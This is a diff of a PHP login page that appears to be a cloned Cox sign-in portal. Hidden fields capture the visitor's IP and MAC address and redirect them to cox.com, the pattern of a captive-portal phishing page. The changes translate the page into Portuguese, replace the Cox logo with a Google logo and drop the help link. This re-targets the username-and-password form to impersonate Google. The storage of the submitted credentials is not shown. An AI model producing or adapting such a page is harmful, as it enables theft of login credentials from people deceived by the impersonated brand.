@@ -34,8 +34,8 @@ require_once('helper.php');
 
       <div class="site-header">
         <div class="cw-container">
-          <!-- <a class="back-link" href="javascript:history.back()">Back</a> -->
-          <a class="back-link" href="index.php">Back</a>
+          <!-- <a class="back-link" href="javascript:history.back()">Voltar</a> -->
+          <a class="back-link" href="index.php">Voltar</a>
           
         </div>
       </div>
@@ -45,10 +45,10 @@ require_once('helper.php');
         <div class="login-card cw-card">
           <header role="banner">
             <h1>
-              <img src="assets/images/cox_logo.png"  border="0" class="" />
+              <img src="assets/images/google-logo.png"  border="0" class="" />
               <!--<img class="logo" v-bind:src="'images/' + mso + '-logo.svg'" v-bind:alt="mso"> -->
             </h1>
-            <p>Sign in with your username and password.</p>
+            <p>Coloque seu usuário e senha.</p>
           </header>
 
 		  <!-- <div style="display:none" id="errorMsg" class="error"></div> -->
@@ -62,12 +62,12 @@ require_once('helper.php');
               <p id="login-error__msg"></p>
             </div>
             <div class="cw-form-group">
-              <label for="username-input">Username</label>
+              <label for="username-input">Usuário</label>
               <input id="username-input" class="cw-form-control" name="email" type="text" required aria-describedby="username-input-error" aria-invalid="false" v-on:blur="validate('username-input')">
               <div id="username-input-error" class="cw-form-control-feedback" role="status"></div>
             </div>
             <div class="cw-form-group">
-              <label for="password-input">Password</label>
+              <label for="password-input">Senha</label>
               <input id="password-input" class="cw-form-control" name="password" type="password" required aria-describedby="password-input-error" aria-invalid="false" v-on:blur="validate('password-input')">
               <div id="password-input-error" class="cw-form-control-feedback" role="status"></div>
             </div>
@@ -76,15 +76,15 @@ require_once('helper.php');
 				<input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
 				<input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
 				<input type="hidden" name="target" value="https://www.cox.com/residential/home.html">
-               <button class="cw-btn cw-btn-primary cw-btn-block" type="submit">Sign In</button>
-             <!--  <input type="submit" name="submit" class="cw-btn cw-btn-primary cw-btn-block" value="Sign In"/> -->
+               <button class="cw-btn cw-btn-primary cw-btn-block" type="submit">Login</button>
+             <!--  <input type="submit" name="submit" class="cw-btn cw-btn-primary cw-btn-block" value="Login"/> -->
             </div>
           </form>
         </div>
 
-        <p><a href="helpce44.php?mso=cox">Need Help?</a></p>
+  
         <div class="terms">
-          <p>By using this service, you agree to the <a class="cw-text-nowrap" href="terms.php" aria-label="Terms of Service">Terms of Service</a>.</p>
+          <p>Ao utilizar esse serviço você concorda com os  <a class="cw-text-nowrap" href="terms.php" aria-label="Terms of Service">termos de serviço</a>.</p>
         </div>
       </main>
 
